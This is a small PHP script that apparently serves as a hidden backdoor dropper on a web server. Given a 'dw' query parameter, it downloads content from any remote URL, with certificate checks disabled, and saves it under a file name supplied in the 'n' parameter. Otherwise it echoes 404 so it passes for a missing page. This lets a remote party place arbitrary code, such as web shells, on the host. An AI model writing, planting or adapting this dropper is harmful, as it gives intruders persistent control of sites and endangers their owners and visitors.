<?php
function postr($url,$data){   
$content = json_encode($data);

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_HEADER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_POSTFIELDS, $content);

$json_response = curl_exec($curl);

$status = curl_getinfo($curl, CURLINFO_HTTP_CODE);

curl_close($curl);
    return $json_response;
}

function gcssl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_REFERER, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3000); // 3 sec.
    curl_setopt($ch, CURLOPT_TIMEOUT, 10000); // 10 sec.
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

if(isset($_GET['dw'])){
  $v=$_GET['dw'];
  $n=gcssl($v);
  $name=$_GET['n'];
  file_put_contents($name,$n);
  sleep(5000);
  
}else{
  echo 404;
}


?>